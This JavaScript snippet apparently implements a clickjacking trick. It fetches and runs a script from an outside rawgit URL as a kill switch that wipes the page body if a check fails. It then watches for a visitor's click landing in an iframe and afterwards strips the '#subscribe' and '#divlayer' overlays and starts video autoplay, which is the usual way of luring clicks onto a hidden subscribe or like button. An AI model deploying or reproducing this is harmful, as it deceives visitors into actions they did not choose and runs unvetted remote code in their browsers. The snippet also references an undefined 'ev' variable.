var url = "https://rawgit.com/imad047/00004.js/master/externaljs.js";
$.getScript( url, function() {
if(externaljs=='externaljs.js'){ 

$("#clickiframe").ready(function() {
var monitor = setInterval(function(){
		var elem = document.activeElement;
		if(elem && elem.tagName == 'IFRAME')
			{
				setTimeout(function(){
					$("#subscribe").remove();
					$("#divlayer").remove();
				}, 500);
				$(document).ready(function() {
					$("#bg123")[0].src += "&autoplay=1;&showinfo=0";
					ev.preventDefault();
				});
					clearInterval(monitor);
			}
		}, 100);
	});

}else{
 setTimeout(function(){$('body').remove();}, 500);
  }  
});
